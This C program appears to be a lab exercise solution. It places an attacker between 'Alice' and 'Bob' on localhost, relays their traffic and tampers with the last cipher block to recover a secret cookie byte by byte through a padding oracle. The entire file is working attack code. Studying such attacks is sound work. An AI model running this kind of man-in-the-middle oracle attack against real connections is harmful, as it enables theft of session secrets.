
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include<arpa/inet.h>
#include<unistd.h>
#include <netinet/in.h>
#include <resolv.h>
#include "openssl/ssl.h"
#include "openssl/err.h"
#include "openssl/des.h"
#include "Attack.h"
 
#define FAIL    -1
#define BUFSIZE 1024

int main(int argc , char *argv[])
{
  int socket_descA, alice_sock, bob_sock, c, read_size;
  struct sockaddr_in bob, alice, oscar;
  char buf[BUFSIZE];
  char* res = malloc(sizeof(char)*9);
  int i, tentative = 0;
  
  //Create socket Alice
  socket_descA = socket(AF_INET , SOCK_STREAM , 0);
  if (socket_descA == -1)
    {
      printf("Could not create socket");
    }
  puts("Socket Alice created");
       
  //Prepare the sockaddr_in structure
  oscar.sin_family = AF_INET;
  oscar.sin_addr.s_addr = INADDR_ANY;
  oscar.sin_port = htons( 4444 );
     
  //Bind
  if( bind(socket_descA,(struct sockaddr *)&oscar , sizeof(oscar)) < 0)
    {
      //print the error message
      perror("bind failed. Error");
      return 1;
    }
  puts("bind Alice done");
       
  //Listen
  listen(socket_descA , 3);
     
  //Accept and incoming connection
  puts("Waiting for incoming connections...");
  c = sizeof(struct sockaddr_in);
     
  //accept connection from an incoming client
  alice_sock = accept(socket_descA, (struct sockaddr *)&alice, (socklen_t*)&c);
  if (alice_sock < 0)
    {
      perror("accept failed");
      return 1;
    }
  puts("Connection to Alice accepted");

  /*********************************************************************/
  
  //Create socket
  bob_sock = socket(AF_INET , SOCK_STREAM , 0);
  if (bob_sock == -1)
    {
      printf("Could not create socket");
    }
  puts("Socket Bob created");
     
  bob.sin_addr.s_addr = inet_addr("127.0.0.1");
  bob.sin_family = AF_INET;
  bob.sin_port = htons( 8888 );
 
  //Connect to remote bob
  if (connect(bob_sock , (struct sockaddr *)&bob , sizeof(bob)) < 0)
    {
      perror("connect failed. Error");
      return 1;
    }
     
  puts("Connected to Bob\n");


  /********************************************************************/

  if((read_size = recv(alice_sock, buf, BUFSIZE, 0)) < 0)
    {
      puts("recv failed");
    }
  else
    buf[read_size] = '\0';

  if(send(bob_sock, buf, strlen(buf), 0) < 0)
    {
      puts("Send failed");
      return 1;
    }

  if((read_size = recv(bob_sock, buf, BUFSIZE, 0)) < 0)
    {
      puts("recv failed");
    }

  if(send(alice_sock, buf, strlen(buf), 0) < 0)
    {
      puts("Send failed");
      return 1;
    }

  for(i = 0; i < 8; ++i)
    {
      tentative = 0;
      memset(buf,0,BUFSIZE);
      while(strcmp(buf,"VALIDE") != 0)
	{
	  tentative++;

	  //printf("\nreceived k to Alice...\n");
	  if((read_size = recv(alice_sock, buf, BUFSIZE, 0)) < 0)
	    {
	      puts("recv failed");
	    }
	  else
	    buf[read_size] = '\0';
	  
	  //printf("send k to Bob...\n");
	  if(send(bob_sock, buf, sizeof(buf), 0) < 0)
	    {
	      puts("Send failed");
	      return 1;
	    }
	  
	  //printf("received k to Bob...\n");
	  if((read_size = recv(bob_sock, buf, BUFSIZE, 0)) < 0)
	    {
	      puts("recv failed");
	    }
	  else
	    buf[read_size] = '\0';
	  
	  //printf("send k to Alice...\n");
	  if(send(alice_sock, buf, sizeof(buf), 0) < 0)
	    {
	      puts("Send failed");
	      return 1;
	    }
	  
	  //printf("received encrypted to Alice...\n");
	  if((read_size = recv(alice_sock, buf, BUFSIZE, 0)) < 0)
	    {
	      puts("recv failed");
	    }
	  else
	    buf[read_size] = '\0';

	  Replace_Last_Block(buf);
	  
	  //printf("send encrypted to Bob...\n");
	  if(send(bob_sock, buf, sizeof(buf), 0) < 0)
	    {
	      puts("Send failed");
	      return 1;
	    }

	  //printf("received result to Bob...\n");
	  if((read_size = recv(bob_sock, buf, BUFSIZE, 0)) < 0)
	    {
	      puts("recv failed");
	    }
	  buf[read_size] = '\0';

	  //printf("send result to Alice...\n");
	  if(send(alice_sock, buf, sizeof(buf), 0) < 0)
	    {
	      puts("Send failed");
	      return 1;
	    }

	}
      res[7-i] = '7' ^ buf[71] ^ buf[31];
       
      printf("Octet %d : %d tentatives\n", 7-i, tentative);

    }
  printf("Cookie = '%s'\n", res);
  
  sleep(1);
  close(alice_sock);
  close(bob_sock);

  return 0;
}
